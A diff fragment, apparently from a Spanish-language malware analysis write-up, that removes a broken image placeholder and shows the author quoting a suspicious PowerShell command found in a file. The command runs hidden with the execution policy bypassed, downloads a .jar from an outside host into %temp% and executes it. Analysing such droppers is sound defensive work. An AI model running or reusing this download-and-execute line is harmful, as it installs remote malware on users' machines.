@@ -82,7 +82,6 @@ Con la herramienta `powershell.exe`.
 
 Al analizar el archivo me encontre con un comando muy sospechoso de powershell, el cual era el siguiente:
 
-![Uploading image.png…]()
 
 ```
 /c powershell -executionpolicy bypass -W Hidden -command "& { (new-object System.Net.WebClient).DownloadFile(\"http://hocoso.mobi\" ,\" %temp%\\6LeGwKmrm.jar\") }" & %temp%\\6LeGwKmrm.jar
